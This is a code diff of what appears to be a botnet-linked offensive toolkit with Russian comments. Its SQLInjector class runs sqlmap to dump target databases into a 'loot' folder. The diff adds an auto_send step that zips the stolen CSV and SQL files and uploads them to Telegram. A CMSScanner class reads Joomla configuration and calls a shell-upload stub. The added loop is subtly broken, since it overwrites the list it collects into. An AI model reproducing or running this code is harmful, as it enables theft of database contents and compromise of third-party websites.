@@ -1,5 +1,6 @@
 import subprocess, json, os, re, requests
 from utils.logger import log
+from botnet.exfil_sender import ExfilSender
 
 class SQLInjector:
     def __init__(self, url, cookie=None, data=None):
@@ -9,11 +10,7 @@ class SQLInjector:
         self.output_dir = "./loot/sqlmap"
 
     def run(self, mode='--dump'):
-        cmd = [
-            'sqlmap', '-u', self.url,
-            '--batch', '--random-agent',
-            '--output-dir', self.output_dir
-        ]
+        cmd = ['sqlmap', '-u', self.url, '--batch', '--random-agent', '--output-dir', self.output_dir]
         if self.cookie:
             cmd += ['--cookie', self.cookie]
         if self.data:
@@ -22,10 +19,26 @@ class SQLInjector:
             cmd += ['--dump']
         elif mode == '--dbs':
             cmd += ['--dbs']
-        log(f"[SQLi] Запуск sqlmap: {' '.join(cmd)}")
+        log(f"[SQLi] sqlmap: {' '.join(cmd)}")
         result = subprocess.run(cmd, capture_output=True, text=True)
         log(f"[SQLi] Результат:\n{result.stdout}")
+        # Авто-отправка, если режим дампа
+        if mode == '--dump' and result.returncode == 0:
+            self.auto_send()
         return result.stdout
+
+    def auto_send(self):
+        files = []
+        for root, dirs, files in os.walk(self.output_dir):
+            for f in files:
+                if f.endswith('.csv') or f.endswith('.sql'):
+                    files.append(os.path.join(root, f))
+        if files:
+            sender = ExfilSender()
+            archive = sender.archive_files(files, "sqli_dump.zip")
+            sender.telegram_upload(archive)
+            log("[SQLi] Дамп отправлен в Telegram")
+
 
 class CMSScanner:
     def __init__(self, target_url):
@@ -78,7 +91,6 @@ class CMSScanner:
             resp = requests.get(api_url, timeout=5)
             if resp.status_code == 200:
                 log(f"[Joomla] Конфигурация: {resp.text}")
-                # попытка загрузить шелл через медиа-менеджер
                 self.upload_shell_joomla()
                 return resp.text
         except Exception as e:
@@ -86,7 +98,7 @@ class CMSScanner:
         return None
 
     def upload_shell_joomla(self):
-        # Упрощенная версия, требуется аутентификация
+        # Заглушка: требуется аутентификация
         pass
 
     def exploit_drupal(self):
